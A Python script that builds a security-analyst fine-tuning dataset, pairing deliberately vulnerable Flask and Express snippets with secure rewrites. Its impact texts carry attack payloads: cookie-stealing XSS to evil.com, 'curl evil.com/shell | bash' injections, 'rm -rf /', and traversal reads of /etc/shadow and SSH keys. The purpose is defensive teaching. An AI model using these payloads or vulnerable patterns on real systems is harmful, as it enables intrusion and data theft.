"""
Dataset Builder for Code Security Analyst LLM
==============================================
Sources:
  1. CVEfixes dataset (real CVE patches from GitHub) — via HuggingFace
  2. SecurityEval dataset (security-focused code benchmarks)
  3. Synthetic augmentation via GPT-style templates
  4. OWASP Top 10 curated examples

Output format: Llama-3 instruction-following format (chat template)
Each sample: { vulnerable_code } → { vuln_type, line, impact, fix, secure_code, cwe }
"""

import json
import re
import random
import sys
import io
from pathlib import Path
from dataclasses import dataclass, field, asdict
from typing import Optional
from datasets import load_dataset
import pandas as pd
from tqdm import tqdm

# Fix Windows console encoding for emoji/unicode output
if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')


# ─────────────────────────────────────────────
# Data Structures
# ─────────────────────────────────────────────

@dataclass
class SecuritySample:
    """A single training example for the security analyst model."""
    vulnerable_code: str
    language: str
    vuln_type: str                    # e.g., "SQL Injection"
    cwe_id: str                       # e.g., "CWE-89"
    owasp_category: str               # e.g., "A03:2021 - Injection"
    vulnerable_line: str              # The specific bad line
    impact: str                       # What an attacker can do
    secure_code: str                  # Fixed version
    explanation: str                  # Why the fix works
    severity: str                     # CRITICAL / HIGH / MEDIUM / LOW
    references: list[str] = field(default_factory=list)  # OWASP / CWE links


# ─────────────────────────────────────────────
# Prompt Templates
# ─────────────────────────────────────────────

SYSTEM_PROMPT = """You are CyberGuard, an elite AI code security analyst.
When given code, you:
1. Identify ALL security vulnerabilities with precision
2. Explain the real-world IMPACT (what an attacker can do)
3. Provide a complete SECURE REWRITE
4. Reference CWE IDs and OWASP categories
5. Teach the developer WHY the fix works

Be concise, technical, and actionable. Always provide working code in fixes."""


def format_llama3_chat(sample: SecuritySample) -> str:
    """Format a sample into Llama-3 chat template format."""
    
    user_message = f"""Analyze this {sample.language} code for security vulnerabilities:

```{sample.language.lower()}
{sample.vulnerable_code}
```

Provide: vulnerability type, affected line, impact, and a secure rewrite."""

    assistant_message = f"""## 🔴 Security Analysis Report

**VULNERABILITY:** {sample.vuln_type} (`{sample.cwe_id}`)
**SEVERITY:** {sample.severity}
**OWASP:** {sample.owasp_category}

---

### 📍 Vulnerable Line
```{sample.language.lower()}
{sample.vulnerable_line}
```

### 💥 Impact
{sample.impact}

### ✅ Secure Rewrite
```{sample.language.lower()}
{sample.secure_code}
```

### 📚 Why This Fix Works
{sample.explanation}

### 🔗 References
{chr(10).join(f"- {ref}" for ref in sample.references)}"""

    # Llama-3 chat format
    text = (
        f"<|begin_of_text|>"
        f"<|start_header_id|>system<|end_header_id|>\n\n{SYSTEM_PROMPT}<|eot_id|>"
        f"<|start_header_id|>user<|end_header_id|>\n\n{user_message}<|eot_id|>"
        f"<|start_header_id|>assistant<|end_header_id|>\n\n{assistant_message}<|eot_id|>"
    )
    return text


# ─────────────────────────────────────────────
# Curated OWASP Top 10 Examples
# ─────────────────────────────────────────────

CURATED_EXAMPLES: list[SecuritySample] = [
    # ── SQL Injection ──────────────────────────────────────
    SecuritySample(
        vulnerable_code='''import sqlite3

def get_user(username: str, password: str):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'"
    cursor.execute(query)
    return cursor.fetchone()''',
        language="Python",
        vuln_type="SQL Injection",
        cwe_id="CWE-89",
        owasp_category="A03:2021 - Injection",
        vulnerable_line='''query = f"SELECT * FROM users WHERE username=\'{username}\' AND password=\'{password}\'"''',
        impact=(
            "An attacker can log in as ANY user by entering `' OR '1'='1` as the username. "
            "They can dump the entire database, delete tables, or execute OS commands if stacked queries are enabled. "
            "Classic payload: `admin'--` bypasses password check entirely."
        ),
        secure_code='''import sqlite3
import hashlib

def get_user(username: str, password: str):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # Use parameterized queries — NEVER interpolate user input
    query = "SELECT * FROM users WHERE username = ? AND password_hash = ?"
    password_hash = hashlib.sha256(password.encode()).hexdigest()
    cursor.execute(query, (username, password_hash))
    return cursor.fetchone()''',
        explanation=(
            "Parameterized queries (prepared statements) separate SQL code from data. "
            "The `?` placeholders tell the database driver that these are *data values*, "
            "not SQL syntax. Even if a user types `' OR 1=1--`, it's treated as a literal string, "
            "not SQL code. Additionally, passwords should be hashed (use `bcrypt` in production, "
            "not SHA-256)."
        ),
        severity="CRITICAL",
        references=[
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/89.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
        ]
    ),

    # ── Hardcoded Credentials ──────────────────────────────
    SecuritySample(
        vulnerable_code='''import boto3

AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
DB_PASSWORD = "SuperSecret123!"

def upload_to_s3(file_path: str, bucket: str):
    client = boto3.client(
        "s3",
        aws_access_key_id=AWS_ACCESS_KEY,
        aws_secret_access_key=AWS_SECRET_KEY
    )
    client.upload_file(file_path, bucket, file_path)''',
        language="Python",
        vuln_type="Hardcoded Credentials / Secret Exposure",
        cwe_id="CWE-798",
        owasp_category="A07:2021 - Identification and Authentication Failures",
        vulnerable_line='AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"',
        impact=(
            "Credentials committed to version control are permanently exposed — even after deletion, "
            "git history retains them. GitHub bots scan public repos in seconds. An attacker "
            "with these AWS keys can spin up thousands of EC2 instances (crypto mining), "
            "exfiltrate S3 data, or rack up a $50,000+ AWS bill."
        ),
        secure_code='''import boto3
import os
from dotenv import load_dotenv

load_dotenv()  # Load from .env file (never commit .env!)

def upload_to_s3(file_path: str, bucket: str):
    # Credentials auto-loaded from environment variables or IAM role
    client = boto3.client("s3")  # boto3 reads AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
    client.upload_file(file_path, bucket, file_path)

# Production: Use IAM roles attached to EC2/Lambda — no keys needed at all''',
        explanation=(
            "Use environment variables or secrets managers (AWS Secrets Manager, HashiCorp Vault). "
            "Add `.env` to `.gitignore` immediately. For production AWS, use IAM roles — "
            "your EC2/Lambda gets temporary credentials automatically with no keys in code. "
            "Run `git secret` or `truffleHog` to audit repos for leaked secrets."
        ),
        severity="CRITICAL",
        references=[
            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
            "https://cwe.mitre.org/data/definitions/798.html",
            "https://12factor.net/config"
        ]
    ),

    # ── XSS ───────────────────────────────────────────────
    SecuritySample(
        vulnerable_code='''from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    # Directly inserting user input into HTML
    html = f"<h1>Welcome, {name}!</h1>"
    return render_template_string(html)''',
        language="Python",
        vuln_type="Cross-Site Scripting (XSS) — Reflected",
        cwe_id="CWE-79",
        owasp_category="A03:2021 - Injection",
        vulnerable_line='html = f"<h1>Welcome, {name}!</h1>"',
        impact=(
            "Attacker sends victim: `/greet?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>` "
            "The victim's browser executes the script, stealing their session cookies. "
            "Attacker hijacks their account without needing their password."
        ),
        secure_code='''from flask import Flask, request
from markupsafe import escape

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    # escape() converts < > & " \' to HTML entities — safe to render
    safe_name = escape(name)
    html = f"<h1>Welcome, {safe_name}!</h1>"
    return html  # Flask auto-escapes in Jinja2 templates too''',
        explanation=(
            "`escape()` converts dangerous HTML characters to safe entities: "
            "`<` → `&lt;`, `>` → `&gt;`, `\"` → `&quot;`. "
            "Even if an attacker injects `<script>`, it renders as visible text, not executable code. "
            "Better yet, use Jinja2 templates — they auto-escape by default. "
            "Never use `render_template_string` with user input."
        ),
        severity="HIGH",
        references=[
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/79.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        ]
    ),

    # ── Path Traversal ─────────────────────────────────────
    SecuritySample(
        vulnerable_code='''from flask import Flask, request, send_file
import os

app = Flask(__name__)
BASE_DIR = "/var/www/uploads"

@app.route("/download")
def download_file():
    filename = request.args.get("filename")
    filepath = os.path.join(BASE_DIR, filename)
    return send_file(filepath)''',
        language="Python",
        vuln_type="Path Traversal / Directory Traversal",
        cwe_id="CWE-22",
        owasp_category="A01:2021 - Broken Access Control",
        vulnerable_line='filepath = os.path.join(BASE_DIR, filename)',
        impact=(
            "Attacker requests `/download?filename=../../../etc/passwd` and gets the server's "
            "user list. With `/download?filename=../../../etc/shadow` they get password hashes. "
            "On a misconfigured server: `/download?filename=../../../root/.ssh/id_rsa` gives "
            "SSH private keys — full server compromise."
        ),
        secure_code='''from flask import Flask, request, send_file, abort
import os

app = Flask(__name__)
BASE_DIR = os.path.realpath("/var/www/uploads")

@app.route("/download")
def download_file():
    filename = request.args.get("filename", "")
    # Resolve the absolute path and verify it stays inside BASE_DIR
    requested_path = os.path.realpath(os.path.join(BASE_DIR, filename))
    
    if not requested_path.startswith(BASE_DIR + os.sep):
        abort(403)  # Forbidden — attempted traversal
    
    if not os.path.isfile(requested_path):
        abort(404)
    
    return send_file(requested_path)''',
        explanation=(
            "`os.path.realpath()` resolves ALL `../` sequences and symlinks to the true absolute path. "
            "We then check with `startswith(BASE_DIR)` that the result is still inside our allowed directory. "
            "Even `....//....//etc/passwd` (double-encoded) gets caught because `realpath` normalizes first. "
            "Never trust `os.path.join` alone — it doesn't prevent traversal."
        ),
        severity="HIGH",
        references=[
            "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            "https://cwe.mitre.org/data/definitions/22.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
        ]
    ),

    # ── Command Injection ──────────────────────────────────
    SecuritySample(
        vulnerable_code='''import os
from flask import Flask, request

app = Flask(__name__)

@app.route("/ping")
def ping():
    host = request.args.get("host", "localhost")
    result = os.popen(f"ping -c 4 {host}").read()
    return f"<pre>{result}</pre>"''',
        language="Python",
        vuln_type="OS Command Injection",
        cwe_id="CWE-78",
        owasp_category="A03:2021 - Injection",
        vulnerable_line='result = os.popen(f"ping -c 4 {host}").read()',
        impact=(
            "Attacker requests `/ping?host=google.com;cat /etc/passwd` — the shell interprets `;` "
            "as a command separator and runs BOTH ping AND cat. "
            "With `host=google.com; curl http://evil.com/shell.sh | bash`, "
            "attacker installs a reverse shell and owns the server."
        ),
        secure_code='''import subprocess
import re
from flask import Flask, request, abort

app = Flask(__name__)

# Allowlist: only valid hostname/IP characters
VALID_HOST_PATTERN = re.compile(r'^[a-zA-Z0-9.-]{1,255}$')

@app.route("/ping")
def ping():
    host = request.args.get("host", "localhost")
    
    if not VALID_HOST_PATTERN.match(host):
        abort(400, "Invalid hostname")
    
    # subprocess with list args — NEVER uses shell=True
    result = subprocess.run(
        ["ping", "-c", "4", host],
        capture_output=True,
        text=True,
        timeout=10,
        shell=False  # Critical: no shell interpretation
    )
    return f"<pre>{result.stdout}</pre>"''',
        explanation=(
            "`subprocess.run()` with a *list* of arguments bypasses the shell entirely. "
            "Each element is passed directly as a separate argument — no shell parsing, "
            "no `;` or `|` interpretation. `shell=False` is the key. "
            "The regex allowlist adds defense-in-depth. "
            "Never use `os.system()`, `os.popen()`, or `subprocess.run(shell=True)` with user input."
        ),
        severity="CRITICAL",
        references=[
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/78.html",
            "https://docs.python.org/3/library/subprocess.html#security-considerations"
        ]
    ),

    # ── Insecure Deserialization ───────────────────────────
    SecuritySample(
        vulnerable_code='''import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/load_session")
def load_session():
    session_data = request.cookies.get("session")
    # Deserializing untrusted data — NEVER DO THIS
    user = pickle.loads(base64.b64decode(session_data))
    return f"Welcome {user[\'name\']}!"''',
        language="Python",
        vuln_type="Insecure Deserialization",
        cwe_id="CWE-502",
        owasp_category="A08:2021 - Software and Data Integrity Failures",
        vulnerable_line="user = pickle.loads(base64.b64decode(session_data))",
        impact=(
            "Attacker crafts a malicious pickle payload that executes arbitrary code on deserialization. "
            "Payload: `import os; os.system('curl evil.com/shell | bash')` wrapped in pickle. "
            "This gives Remote Code Execution (RCE) — game over. "
            "This is how the PyYAML RCE (CVE-2017-18342) and many real breaches happened."
        ),
        secure_code='''import json
import hmac
import hashlib
import base64
from flask import Flask, request, abort

app = Flask(__name__)
SECRET_KEY = "load-from-env-not-hardcoded"  # Use os.environ["SECRET_KEY"]

def sign_data(data: dict) -> str:
    """Create a signed JSON token."""
    payload = json.dumps(data, sort_keys=True).encode()
    sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()
    token = base64.b64encode(payload).decode() + "." + sig
    return token

def verify_and_load(token: str) -> dict:
    """Verify signature before loading."""
    try:
        encoded, sig = token.rsplit(".", 1)
        payload = base64.b64decode(encoded)
        expected = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected):
            abort(403)  # Tampered!
        return json.loads(payload)
    except Exception:
        abort(400)

@app.route("/load_session")
def load_session():
    token = request.cookies.get("session", "")
    user = verify_and_load(token)
    return f"Welcome {user[\'name\']}!"''',
        explanation=(
            "NEVER deserialize untrusted data with pickle, PyYAML (unsafe_load), or Java ObjectInputStream. "
            "Use JSON for data serialization — it cannot execute code. "
            "Add HMAC signatures to detect tampering. "
            "For sessions specifically, use Flask-Session with server-side storage or JWT with proper validation."
        ),
        severity="CRITICAL",
        references=[
            "https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/",
            "https://cwe.mitre.org/data/definitions/502.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
        ]
    ),

    # ── IDOR ──────────────────────────────────────────────
    SecuritySample(
        vulnerable_code='''from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

@app.route("/api/invoice/<int:invoice_id>")
def get_invoice(invoice_id: int):
    # No authorization check — any user can access any invoice!
    conn = sqlite3.connect("billing.db")
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM invoices WHERE id = ?", (invoice_id,))
    invoice = cursor.fetchone()
    return jsonify(invoice)''',
        language="Python",
        vuln_type="Insecure Direct Object Reference (IDOR)",
        cwe_id="CWE-639",
        owasp_category="A01:2021 - Broken Access Control",
        vulnerable_line='cursor.execute("SELECT * FROM invoices WHERE id = ?", (invoice_id,))',
        impact=(
            "Any authenticated user can access ANY invoice by incrementing the ID: "
            "/api/invoice/1, /api/invoice/2, /api/invoice/3... "
            "In a real billing system this leaks customer PII, payment info, business revenue data. "
            "This was the #1 bug in Facebook's early API and caused multiple major data breaches."
        ),
        secure_code='''from flask import Flask, request, jsonify, abort
from functools import wraps
import sqlite3
import jwt  # pip install PyJWT
import os

app = Flask(__name__)
JWT_SECRET = os.environ["JWT_SECRET"]

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        try:
            payload = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
            request.user_id = payload["user_id"]
        except jwt.InvalidTokenError:
            abort(401)
        return f(*args, **kwargs)
    return decorated

@app.route("/api/invoice/<int:invoice_id>")
@require_auth
def get_invoice(invoice_id: int):
    conn = sqlite3.connect("billing.db")
    cursor = conn.cursor()
    # ALWAYS filter by both resource ID AND authenticated user_id
    cursor.execute(
        "SELECT * FROM invoices WHERE id = ? AND user_id = ?",
        (invoice_id, request.user_id)
    )
    invoice = cursor.fetchone()
    if not invoice:
        abort(404)  # Return 404, not 403 (don\'t reveal existence)
    return jsonify(invoice)''',
        explanation=(
            "Always enforce ownership checks: `WHERE id = ? AND user_id = ?`. "
            "Authenticate first (JWT/session), then authorize (does this user OWN this resource?). "
            "Return 404 (not 403) when access is denied — don't reveal whether the resource exists. "
            "Consider UUIDs instead of sequential integers to prevent enumeration."
        ),
        severity="HIGH",
        references=[
            "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
            "https://cwe.mitre.org/data/definitions/639.html",
            "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
        ]
    ),
]


# ─────────────────────────────────────────────
# JavaScript / Node.js Examples
# ─────────────────────────────────────────────

JS_EXAMPLES: list[SecuritySample] = [
    SecuritySample(
        vulnerable_code='''const express = require('express');
const app = express();

app.get('/search', (req, res) => {
    const query = req.query.q;
    // Directly injecting user input into HTML
    res.send(`<h1>Results for: ${query}</h1>`);
});''',
        language="JavaScript",
        vuln_type="Cross-Site Scripting (XSS) — Reflected",
        cwe_id="CWE-79",
        owasp_category="A03:2021 - Injection",
        vulnerable_line="res.send(`<h1>Results for: ${query}</h1>`);",
        impact=(
            "Attacker shares URL: `/search?q=<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>` "
            "Every victim who clicks the link leaks their session cookie to the attacker."
        ),
        secure_code='''const express = require('express');
const escapeHtml = require('escape-html');  // npm install escape-html
const app = express();

app.get('/search', (req, res) => {
    const query = escapeHtml(req.query.q || '');
    // Or better: use a templating engine with auto-escaping (Handlebars, EJS with <%=)
    res.send(`<h1>Results for: ${query}</h1>`);
});''',
        explanation=(
            "`escape-html` converts `<`, `>`, `&`, `\"`, `'` to HTML entities. "
            "Alternatively use `res.json()` for API responses (no HTML parsing). "
            "For server-rendered HTML, use Handlebars (default: auto-escape) or EJS with `<%= %>`. "
            "Set `Content-Security-Policy` headers as defense-in-depth."
        ),
        severity="HIGH",
        references=[
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/79.html"
        ]
    ),

    SecuritySample(
        vulnerable_code='''const { exec } = require('child_process');
const express = require('express');
const app = express();

app.get('/convert', (req, res) => {
    const filename = req.query.file;
    // Shell injection via template literal
    exec(`convert ${filename} output.png`, (err, stdout) => {
        res.send(stdout);
    });
});''',
        language="JavaScript",
        vuln_type="OS Command Injection",
        cwe_id="CWE-78",
        owasp_category="A03:2021 - Injection",
        vulnerable_line="exec(`convert ${filename} output.png`, (err, stdout) => {",
        impact=(
            "Request: `/convert?file=image.jpg;%20rm%20-rf%20/` deletes the entire filesystem. "
            "Or: `/convert?file=x;curl%20evil.com/shell|bash` installs a reverse shell."
        ),
        secure_code='''const { execFile } = require('child_process');
const path = require('path');
const express = require('express');
const app = express();

const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp']);
const UPLOAD_DIR = '/var/uploads';

app.get('/convert', (req, res) => {
    const filename = path.basename(req.query.file || '');  // Strip directory components
    const ext = path.extname(filename).toLowerCase();
    
    if (!ALLOWED_EXTENSIONS.has(ext)) {
        return res.status(400).send('Invalid file type');
    }
    
    const inputPath = path.join(UPLOAD_DIR, filename);
    
    // execFile passes args as array — no shell interpretation
    execFile('convert', [inputPath, 'output.png'], (err, stdout) => {
        if (err) return res.status(500).send('Conversion failed');
        res.send('Converted successfully');
    });
});''',
        explanation=(
            "`execFile()` vs `exec()`: execFile passes arguments as an array — no shell spawned, "
            "no `;`, `|`, or `&&` interpretation. `path.basename()` strips directory traversal. "
            "Extension allowlisting prevents processing unexpected file types. "
            "Never use `exec()`, `eval()`, or `spawn('sh', ['-c', userInput])`."
        ),
        severity="CRITICAL",
        references=[
            "https://owasp.org/Top10/A03_2021-Injection/",
            "https://cwe.mitre.org/data/definitions/78.html"
        ]
    ),
]


# ─────────────────────────────────────────────
# Dataset Builder
# ─────────────────────────────────────────────

def load_security_eval_dataset() -> list[SecuritySample]:
    """
    Attempt to load SecurityEval from HuggingFace.
    Falls back to empty list if unavailable.
    SecurityEval: https://huggingface.co/datasets/s2e-lab/SecurityEval
    """
    try:
        ds = load_dataset("s2e-lab/SecurityEval", split="train", trust_remote_code=True)
        samples = []
        for row in ds:
            # SecurityEval has "Prompt" and "Insecure_code" columns
            if not row.get("Insecure_code"):
                continue
            # Create a simplified sample (SecurityEval doesn't have full analysis)
            # We use it for the vulnerable code portion and generate analysis
            print(f"  ℹ SecurityEval loaded {len(ds)} raw samples (need manual analysis annotation)")
            break  # Just check it loads
        return []  # Return empty — SecurityEval needs manual annotation for our format
    except Exception as e:
        print(f"  ⚠ SecurityEval not available: {e}")
        return []


def augment_with_variants(sample: SecuritySample, n: int = 2) -> list[SecuritySample]:
    """
    Create simple variants of a sample to increase dataset diversity.
    Varies variable names, adds/removes comments, wraps in classes.
    """
    variants = []

    # Variant 1: Wrap in a class
    if sample.language == "Python" and n >= 1:
        class_code = f"""class UserManager:
    def __init__(self, db_path: str = "app.db"):
        self.db_path = db_path
    
    def process(self, user_input: str):
{chr(10).join('        ' + line for line in sample.vulnerable_code.splitlines())}"""
        v1 = SecuritySample(
            vulnerable_code=class_code,
            language=sample.language,
            vuln_type=sample.vuln_type,
            cwe_id=sample.cwe_id,
            owasp_category=sample.owasp_category,
            vulnerable_line=sample.vulnerable_line,
            impact=sample.impact,
            secure_code=sample.secure_code,
            explanation=sample.explanation,
            severity=sample.severity,
            references=sample.references,
        )
        variants.append(v1)

    return variants


def build_dataset(output_path: str = "./data/security_instruct_dataset.jsonl") -> int:
    """Build and save the full training dataset."""

    all_samples: list[SecuritySample] = []

    print("📦 Loading curated OWASP examples...")
    all_samples.extend(CURATED_EXAMPLES)
    print(f"  ✓ Added {len(CURATED_EXAMPLES)} Python examples")

    print("📦 Loading JavaScript examples...")
    all_samples.extend(JS_EXAMPLES)
    print(f"  ✓ Added {len(JS_EXAMPLES)} JS examples")

    print("🔄 Augmenting with variants...")
    augmented = []
    for sample in all_samples:
        augmented.extend(augment_with_variants(sample, n=1))
    all_samples.extend(augmented)
    print(f"  ✓ Added {len(augmented)} augmented variants")

    print("🔄 Trying external datasets...")
    external = load_security_eval_dataset()
    all_samples.extend(external)

    # Shuffle
    random.seed(42)
    random.shuffle(all_samples)

    # Format and save
    output_file = Path(output_path)
    output_file.parent.mkdir(exist_ok=True)

    formatted = []
    for sample in all_samples:
        text = format_llama3_chat(sample)
        formatted.append({"text": text, "metadata": {
            "vuln_type": sample.vuln_type,
            "cwe_id": sample.cwe_id,
            "language": sample.language,
            "severity": sample.severity,
        }})

    with open(output_file, "w", encoding="utf-8") as f:
        for item in formatted:
            f.write(json.dumps(item, ensure_ascii=False) + "\n")

    print(f"\n✅ Dataset built: {len(formatted)} samples → {output_path}")
    return len(formatted)


if __name__ == "__main__":
    count = build_dataset()
    print(f"\n📊 Total training samples: {count}")
    print("💡 For more data, add samples to CURATED_EXAMPLES or integrate CVEfixes dataset.")

